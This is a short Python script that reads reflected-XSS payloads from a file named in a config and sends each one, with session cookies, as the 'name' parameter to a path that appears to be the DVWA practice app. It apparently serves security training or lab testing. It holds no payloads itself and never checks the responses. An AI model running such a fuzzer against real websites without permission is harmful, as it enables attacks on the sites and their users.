import configparser
from requests.compat import urljoin
import requests


xss_ref_path = 'vulnerabilities/xss_r/'
param = '?name=NAME'
config = configparser.ConfigParser()
config.read('config.ini')


# Reflected XSS
def attack(session):
    xss_file = config["xss"]["file"]
    xss_param_values = []
    xss_param_values.extend(open(xss_file, "r", errors='replace').readlines())

    for v in xss_param_values:
        # Prepare the GET request
        xssr_url = urljoin(session.get_base_url(), xss_ref_path + param + v)
        # Send the GET request
        r = requests.get(xssr_url, cookies=session.get_cookies())
        #print(r.url)
